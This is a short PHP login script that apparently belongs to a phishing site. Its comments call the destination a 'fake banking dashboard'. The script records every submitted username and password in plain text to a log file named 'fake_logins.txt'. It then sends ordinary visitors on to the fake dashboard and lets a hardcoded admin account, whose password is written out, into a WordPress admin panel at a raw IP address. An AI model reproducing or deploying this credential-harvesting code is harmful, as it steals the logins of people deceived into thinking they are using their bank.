<?php
session_start();

// Capture login credentials from POST request
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Log the credentials for tracking (optional)
file_put_contents('/var/log/fake_logins.txt', "User: $username, Pass: $password\n", FILE_APPEND);

// Check if the user is the admin
if ($username === 'Karthiian' && $password === 'X&umgQ9\'ZJ\"y)Q2') {
    // Redirect admin to WordPress dashboard
    header("Location: http://51.21.224.96/wp-admin");
    exit();
} else {
    // Redirect normal users to the fake banking dashboard
    header("Location: http://51.21.224.96/app/dashboard.tsx");
    exit();

}
?>
